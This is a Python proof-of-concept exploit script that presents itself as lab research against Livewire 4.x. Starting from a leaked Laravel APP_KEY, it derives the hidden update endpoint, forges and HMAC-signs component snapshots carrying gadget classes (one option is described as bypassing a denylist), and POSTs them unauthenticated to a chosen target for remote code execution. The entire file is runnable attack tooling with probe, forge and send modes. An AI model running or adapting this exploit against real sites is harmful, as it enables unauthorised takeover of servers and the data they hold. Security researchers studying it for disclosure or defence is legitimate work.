#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
poc.py - Livewire 4.x chain: leaked APP_KEY -> hidden endpoint -> forged snapshot
         -> unauthenticated POST -> gadget executes (RCE, system() proven in lab).

LAB / RESEARCH PoC - mirrors this repo's tests/ZeroDay{Proof,Chain,Http,System}Test.php.
Python 3 stdlib only (hmac, hashlib, base64, json, urllib).

Chain:
  1. APP_KEY from a leaked .env            (the ONLY secret; endpoint prefix derives from it)
  2. endpoint = /livewire-<sha256(config_key . 'livewire-endpoint')[:8]>/update
  3. forge component snapshot: data[prop] = [value, {s: 'wrbl'|'elcln', class, ...}]
  4. re-sign HMAC-SHA256 with APP_KEY, using a PHP json_encode-compatible encoder
  5. POST {components:[{snapshot, updates:[], calls:[]}]} with X-Livewire: true
  6. gadget: 'wrbl' -> $meta['class']::fromLivewire($value)   (app-side Wireable)
             'elcln' -> new $class() / (new $modelClass)       (ctor / __call primitive)

Modes:
  endpoint   print the derived update endpoint
  probe      GET derived asset paths to confirm Livewire is exposed
  forge      build + sign a forged snapshot offline -> --out file
  send       forge in memory and POST to --target

Capture a live snapshot from the target page (wire:snapshot="...") and keep its
memo (id/name/path/release) intact; only data[prop] is replaced.

Authorized lab use only.
"""

from __future__ import annotations

import argparse
import base64
import copy
import hashlib
import hmac
import json
import os
import re
import sys
import urllib.error
import urllib.request


# --------------------------------------------------------------------------- #
# PHP json_encode() compatibility (defaults: escape solidus + unicode)
# Checksum::generate() = hash_hmac('sha256', json_encode($snap), key) on the
# SERVER side, so our HMAC input must be byte-identical to PHP's encoding.
# --------------------------------------------------------------------------- #
def php_json_encode(value) -> str:
    if value is None:
        return "null"
    if value is True:
        return "true"
    if value is False:
        return "false"
    if isinstance(value, bool):  # pragma: no cover - guarded above
        return "true" if value else "false"
    if isinstance(value, int):
        return str(value)
    if isinstance(value, float):
        raise ValueError("floats unsupported in snapshots (use str/int/bool/list/dict)")
    if isinstance(value, str):
        return _php_str(value)
    if isinstance(value, list):
        return "[" + ",".join(php_json_encode(v) for v in value) + "]"
    if isinstance(value, dict):
        return "{" + ",".join(_php_str(str(k)) + ":" + php_json_encode(v) for k, v in value.items()) + "}"
    raise TypeError("unsupported type: %r" % type(value))


def _php_str(s: str) -> str:
    out = []
    for ch in s:
        o = ord(ch)
        if ch == '"':
            out.append('\\"')
        elif ch == "\\":
            out.append("\\\\")
        elif ch == "/":
            out.append("\\/")          # PHP escapes solidus by default
        elif ch == "\b":
            out.append("\\b")
        elif ch == "\f":
            out.append("\\f")
        elif ch == "\n":
            out.append("\\n")
        elif ch == "\r":
            out.append("\\r")
        elif ch == "\t":
            out.append("\\t")
        elif o < 0x20:
            out.append("\\u%04x" % o)
        elif o < 0x80:
            out.append(ch)
        elif o <= 0xFFFF:
            out.append("\\u%04x" % o)   # includes U+2028/2029 (PHP default)
        else:                            # astral -> UTF-16 surrogate pair
            o -= 0x10000
            out.append("\\u%04x\\u%04x" % (0xD800 + (o >> 10), 0xDC00 + (o & 0x3FF)))
    return '"' + "".join(out) + '"'


# --------------------------------------------------------------------------- #
# APP_KEY handling
# --------------------------------------------------------------------------- #
def read_env_app_key(path: str) -> str:
    with open(path, "r", errors="replace") as fh:
        for line in fh:
            m = re.match(r"\s*APP_KEY\s*=\s*(.+?)\s*$", line)
            if m:
                return m.group(1).strip().strip('"').strip("'")
    raise SystemExit("[-] APP_KEY not found in %s" % path)


def key_pair(app_key: str):
    """Return (config_string, raw_hmac_key).
    config('app.key') keeps the 'base64:' prefix (used for the endpoint hash),
    while Encrypter::getKey() returns the DECODED bytes (used for the HMAC)."""
    s = app_key.strip()
    if s.startswith("base64:"):
        raw = base64.b64decode(s[7:])
    else:
        raw = s.encode("utf-8")
    if len(raw) not in (16, 24, 32):
        raise SystemExit("[-] APP_KEY decodes to %d bytes (want 16/24/32)" % len(raw))
    return s, raw


def endpoint_path(config_key: str) -> str:
    h = hashlib.sha256((config_key + "livewire-endpoint").encode("utf-8")).hexdigest()[:8]
    return "/livewire-" + h + "/update"


# --------------------------------------------------------------------------- #
# Snapshot forge + sign
# --------------------------------------------------------------------------- #
def sign_snapshot(snapshot: dict, raw_key: bytes) -> dict:
    snap = copy.deepcopy(snapshot)
    snap.pop("checksum", None)
    memo = snap.get("memo")
    if isinstance(memo, dict):
        memo.pop("children", None)     # Checksum::generate excludes memo.children
    mac = hmac.new(raw_key, php_json_encode(snap).encode("utf-8"), hashlib.sha256).hexdigest()
    snap["checksum"] = mac
    return snap


def apply_payload(snapshot: dict, prop: str, synth: str, gadget: str,
                  model_class: str | None = None, value=None) -> dict:
    snap = copy.deepcopy(snapshot)
    data = snap.setdefault("data", {})
    if synth == "wrbl":
        # WireableSynth: is_a(Wireable) check only, then $class::fromLivewire($value)
        meta = {"s": "wrbl", "class": gadget}
        val = value if value is not None else [{"cmd": "id"}]
    elif synth == "elcln":
        # EloquentCollectionSynth: keys=[] -> new $class(); modelClass unvalidated
        meta = {"s": "elcln", "class": gadget, "modelClass": model_class or gadget, "keys": []}
        val = value if value is not None else [None]
    else:
        raise SystemExit("[-] unknown synth %r (use wrbl|elcln)" % synth)
    data[prop] = [val, meta]           # synthetic tuple: meta MUST be payload[1]
    return snap


# --------------------------------------------------------------------------- #
# HTTP
# --------------------------------------------------------------------------- #
def load_cookie_header(path: str) -> dict:
    """Parse a Netscape cookie jar (curl -c) into Cookie/X-XSRF-TOKEN headers.

    The update route runs the web middleware group (VerifyCsrfToken), so a
    real request needs the session cookie plus X-XSRF-TOKEN (urldecoded
    XSRF-TOKEN cookie value) to pass the 419 gate.
    """
    from urllib.parse import unquote

    cookies = {}
    with open(path, "r", encoding="utf-8") as fh:
        for line in fh:
            line = line.rstrip("\n")
            if line.startswith("#HttpOnly_"):
                line = line[len("#HttpOnly_"):]  # curl marks HttpOnly rows this way
            elif line.startswith("#") or not line.strip():
                continue
            parts = line.split("\t")
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]

    headers = {}
    if cookies:
        headers["Cookie"] = "; ".join("%s=%s" % (k, v) for k, v in cookies.items())
        xsrf = cookies.get("XSRF-TOKEN")
        if xsrf:
            headers["X-XSRF-TOKEN"] = unquote(xsrf)
    return headers


def post_update(target: str, config_key: str, snapshot: dict, timeout: float = 20.0,
                cookie_file: str | None = None):
    url = target.rstrip("/") + endpoint_path(config_key)
    inner = json.dumps(snapshot, ensure_ascii=False, separators=(",", ":"))
    body = json.dumps({"components": [{"snapshot": inner, "updates": [], "calls": []}]},
                      ensure_ascii=False, separators=(",", ":"))
    headers = {
        "Content-Type": "application/json; charset=utf-8",
        "X-Livewire": "true",
        "Accept": "application/json",
    }
    if cookie_file:
        headers.update(load_cookie_header(cookie_file))
    req = urllib.request.Request(url, data=body.encode("utf-8"), method="POST", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return url, resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return url, exc.code, exc.read().decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001 - report any transport failure
        return url, None, repr(exc)


def probe(target: str, config_key: str, timeout: float = 10.0):
    base = target.rstrip("/")
    derived = base + endpoint_path(config_key).replace("/update", "/livewire.js")
    candidates = [derived, base + "/livewire.js", base + "/livewire.min.js"]
    hits = []
    for url in candidates:
        try:
            req = urllib.request.Request(url, headers={"Accept": "*/*"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                hits.append((url, resp.status, resp.headers.get("Content-Type", "")))
        except urllib.error.HTTPError as exc:
            hits.append((url, exc.code, ""))
        except Exception as exc:  # noqa: BLE001
            hits.append((url, None, repr(exc)))
    return hits


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def add_key_args(parser: argparse.ArgumentParser) -> None:
    grp = parser.add_mutually_exclusive_group(required=True)
    grp.add_argument("--app-key", help="APP_KEY value (base64:...)")
    grp.add_argument("--env", help="path to a leaked .env file containing APP_KEY=")


def resolve_key(args):
    raw = args.app_key if args.app_key else read_env_app_key(args.env)
    return key_pair(raw)


def load_snapshot(path: str) -> dict:
    with open(path, "r", encoding="utf-8") as fh:
        snap = json.load(fh)
    if not isinstance(snap, dict) or "data" not in snap:
        raise SystemExit("[-] %s is not a Livewire snapshot (need a JSON object with 'data')" % path)
    return snap


def parse_value(arg: str | None):
    if arg is None:
        return None
    return json.loads(arg)


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        prog="poc.py",
        description="Livewire 4.x APP_KEY -> unauthenticated gadget RCE (lab PoC).",
        epilog="Authorized lab use only. Chain proven in tests/ZeroDay*Test.php.",
    )
    sub = ap.add_subparsers(dest="mode", required=True)

    p = sub.add_parser("endpoint", help="print derived update endpoint")
    add_key_args(p)

    p = sub.add_parser("probe", help="check whether Livewire endpoints answer on target")
    add_key_args(p)
    p.add_argument("--target", required=True, help="http://host[:port]")
    p.add_argument("--timeout", type=float, default=10.0)

    def forge_args(p):
        add_key_args(p)
        p.add_argument("--snapshot", required=True, help="captured snapshot JSON (wire:snapshot)")
        p.add_argument("--prop", default="value", help="component property to replace")
        p.add_argument("--synth", choices=("wrbl", "elcln"), default="wrbl")
        p.add_argument("--gadget", required=True, help="gadget class (FQCN)")
        p.add_argument("--model-class", help="elcln modelClass override (bypasses denylist)")
        p.add_argument("--value-json", help="custom tuple value as JSON")

    p = sub.add_parser("forge", help="build + HMAC-sign a forged snapshot offline")
    forge_args(p)
    p.add_argument("--out", required=True, help="output path for signed snapshot")

    p = sub.add_parser("send", help="forge and POST to target")
    forge_args(p)
    p.add_argument("--target", required=True)
    p.add_argument("--timeout", type=float, default=20.0)
    p.add_argument("--cookie-file", help="Netscape cookie jar (curl -c) for CSRF-gated endpoints")

    args = ap.parse_args(argv)
    config_key, raw_key = resolve_key(args)

    if args.mode == "endpoint":
        print(endpoint_path(config_key))
        return 0

    if args.mode == "probe":
        for url, status, extra in probe(args.target, config_key, args.timeout):
            print("%s  %s  %s" % (status, url, extra))
        return 0

    snap = load_snapshot(args.snapshot)
    snap = apply_payload(snap, args.prop, args.synth, args.gadget,
                         model_class=args.model_class, value=parse_value(args.value_json))
    signed = sign_snapshot(snap, raw_key)

    if args.mode == "forge":
        with open(args.out, "w", encoding="utf-8") as fh:
            json.dump(signed, fh, ensure_ascii=False, indent=2)
        print("[+] endpoint : %s" % endpoint_path(config_key))
        print("[+] checksum : %s" % signed["checksum"])
        print("[+] written  : %s" % args.out)
        return 0

    # send
    url, status, body = post_update(args.target, config_key, signed, args.timeout,
                                    cookie_file=getattr(args, "cookie_file", None))
    print("[>] POST %s" % url)
    print("[<] status: %s" % status)
    print(body[:2000])
    if status is None:
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
